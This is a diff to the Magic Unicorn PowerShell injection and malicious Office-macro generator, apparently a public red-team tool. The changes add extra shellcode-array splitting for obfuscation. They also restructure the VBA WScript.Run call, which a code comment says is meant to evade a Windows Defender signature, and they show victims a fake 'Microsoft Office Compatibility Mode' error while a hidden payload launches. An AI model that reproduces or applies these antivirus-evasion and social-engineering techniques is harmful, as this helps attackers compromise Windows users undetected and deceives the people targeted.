@@ -429,7 +429,7 @@ python unicorn.py ms
 
 # usage banner
 def gen_usage():
-    print("-------------------- Magic Unicorn Attack Vector v3.2.5 -----------------------------")
+    print("-------------------- Magic Unicorn Attack Vector v3.2.6 -----------------------------")
     print("\nNative x86 powershell injection attacks on any Windows platform.")
     print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
     print("Twitter: @TrustedSec, @HackingDave")
@@ -476,6 +476,14 @@ def liquify_bytes(bytes, stub):
         whopper = "royalewithcheese" # pulp fiction reference
         bytes = bytes.split(",0x8b,0x52,0x0c,")
         bytes = (bytes[0] + ");$" + goat_romper + "=@(0x8b,0x52,0x0c," + bytes[1])
+
+    # split again, we can do this all day
+    whopper2 = ""
+    if match:
+        goat_romper2 = generate_random_string(2,4)
+        whopper2 = "royalewithcheese"
+        bytes = bytes.split(",0xc7,0xe2,")
+        bytes = (bytes[0] + ");$" + goat_romper2 + "=@(0xc7,0xe2," + bytes[1])
 
     bytes = bytes.split(",")
     counter = 0
@@ -559,6 +567,7 @@ def liquify_bytes(bytes, stub):
 
     # if we are hungry
     if whopper != "": assemble = assemble + " + $" + goat_romper 
+    if whopper2 != "": assemble = assemble + " + $" + goat_romper2
     if a2 != "": assemble = assemble + " + $" + a2
     if a3 != "": assemble = assemble + " + $" + a3
     if a4 != "": assemble = assemble + " + $" + a4 
@@ -617,7 +626,8 @@ def scramble_stuff():
     return full_exe + "," + ps_only + "," + full_wscript + "," + full_shell
 
 # generate full macro
-def generate_macro(full_attack, line_length=800):
+def generate_macro(full_attack, line_length=780):
+
     # randomize macro name
     macro_rand = generate_random_string(5, 10)
 
@@ -639,6 +649,7 @@ def generate_macro(full_attack, line_length=800):
     # remove first occurrence of &
     macro_str = macro_str.replace("& ", "", 1)
     macro_str = macro_str.replace('powershell /w 1 /C "', r' /w 1 /C ""')
+    macro_str = macro_str.replace('/w 1', "") # no longer needed
     macro_str = macro_str.replace("')", "')\"\"")
 
     # obfsucate the hell out of Shell and PowerShell
@@ -663,8 +674,17 @@ def generate_macro(full_attack, line_length=800):
     function5 = generate_random_string(5, 15)
     function6 = generate_random_string(5, 15)
 
-    # our final product of obfsucated code
-    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim {14}\n{14} = {15} & " "\n{16} = {17}.Run({18} & {19}, 0, False)\nDim title As String\ntitle = "Microsoft Office Corrupt Application (Compatibility Mode)"\nDim msg As String\nDim intResponse As Integer\nmsg = "This application appears to be made on an older version of the Microsoft Office product suite. Please have the author save to a newer and supported format. [Error Code: -219]"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6, macro_rand))
+    # our message we present to the end user - can change this to whatever you want
+    macro_message = ("This application appears to have been made with an older version of the Microsoft Office product suite. Please have the author save this document to a newer and supported format. [Error Code: -219]")
+
+    # title bar on top what it states there, you can also change this to whatever you want
+    subject_message = ("Microsoft Office (Compatibility Mode)")
+ 
+    # our final product of obfsucated code - note that defender made a signature to look for WScript.Run with a compacted string with a "False" terminal window. Just needed to split it out into two lines :P
+    macro_str += ("""\n\nDim {0}\n{1} = {2}\nDim {3}\n{4} = {5}\nDim {6}\n{7} = {8} & "." & {9}\nDim {10}\nDim {11}\nSet {12} = VBA.CreateObject({13})\nDim waitOnReturn As Boolean: waitOnReturn = False\nDim windowStyle As Integer: windowStyle = 0\nDim {14}\n{14} = {15} & " "\n{17}.Run {18} & {19}, windowStyle, waitOnReturn\n\nDim title As String\ntitle = "{21}"\nDim msg As String\nDim intResponse As Integer\nmsg = "{20}"\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub""".format(function1, function1, shell, function2, function2, wscript, function3, function3, function2, function1, function4, function5, function4, function3, function6, ps_long, function5, function4, function6,macro_rand,macro_message,subject_message))
+
+    # strip and fix issues
+    macro_str = macro_str.replace("''", "")
 
     return macro_str
 
@@ -1211,6 +1231,10 @@ try:
     elif len(sys.argv) < 2:
         gen_unicorn()
         gen_usage()
+
+except KeyboardInterrupt:
+    print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
+    sys.exit()
 
 except Exception as e:
     if "list index" in str(e): 
